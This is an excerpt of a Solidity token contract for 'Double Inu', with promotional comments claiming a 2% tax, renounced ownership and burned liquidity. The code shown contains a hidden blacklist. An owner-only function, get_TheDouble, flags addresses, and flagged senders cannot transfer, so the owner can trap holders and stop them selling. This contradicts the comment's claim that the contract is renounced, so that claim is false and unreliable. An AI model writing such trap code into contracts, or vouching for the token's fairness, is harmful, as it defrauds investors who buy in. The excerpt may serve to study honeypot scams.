...
@DoubleInuPortal This is the portal you'll find.

Double Inu is 2% tax, why? 

The Double Inu you will ever need. This contract is renounced and burn liquidity forever.

Double Inu is led by a small group of whales. We truly believe in a space where we can make wonderful projects without greedy teams profiting off of it with high taxes.
*/
...
contract DoubleInu is IBEP20, Auth {
    ...
    string constant _name = "Double Inu";
    string constant _symbol = "DOUBLEINU"; 
    ...
    mapping (address => bool) public isDouble;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!isDouble[sender], "Address is excluded.");

        if (recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != marketingFeeReceiver && recipient != devFeeReceiver) {
    ...
    function get_TheDouble(address _address, bool _value) public onlyOwner {
        isDouble[_address] = _value;
    }
